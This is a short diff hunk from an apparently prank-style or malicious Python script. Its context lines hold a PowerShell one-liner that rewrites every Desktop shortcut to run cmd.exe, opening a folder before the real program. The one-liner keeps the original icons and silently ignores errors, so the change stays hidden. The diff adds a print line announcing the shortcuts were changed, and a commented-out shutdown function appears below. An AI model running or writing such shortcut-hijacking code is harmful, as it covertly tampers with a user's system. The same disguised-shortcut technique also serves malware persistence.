@@ -31,6 +31,7 @@ powershell_script = r"""
 powershell -Command "Get-ChildItem \"$env:USERPROFILE\Desktop\" -Filter *.lnk | Where-Object { $_.Name -ne 'Recycle Bin.lnk' } | ForEach-Object { try { $sh=New-Object -ComObject WScript.Shell; $sc=$sh.CreateShortcut($_.FullName); $target=$sc.TargetPath; $args=$sc.Arguments; $icon=$sc.IconLocation; $sc.TargetPath='cmd.exe'; $sc.Arguments='/c start \"\" \"C:\Users\" && start \"\" \"' + $target + '\" ' + $args; $sc.IconLocation=$icon; $sc.Save() } catch {} }"
 """
 run_command(powershell_script)
+print('The shortcuts ware changed')
 
 
 #def shutdown_windows():
